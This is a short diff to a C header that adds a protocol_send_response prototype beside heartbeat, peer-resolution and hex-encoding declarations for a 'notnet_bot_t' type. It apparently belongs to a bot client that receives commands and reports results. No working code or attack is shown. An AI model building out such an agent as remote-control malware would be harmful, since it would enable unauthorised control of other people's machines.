@@ -133,6 +133,7 @@ int protocol_send_heartbeat(notnet_bot_t *bot);
 int protocol_resolve_peers(notnet_bot_t *bot);
 int protocol_resolve_host(const char *host);
 char *protocol_hex_encode(const char *data, int len);
+int protocol_send_response(notnet_bot_t *bot, const char *command, const char *result);
 
 /* ── Config ─────────────────────────────────────────────────── */
 int load_config(notnet_bot_t *bot, const char *path);
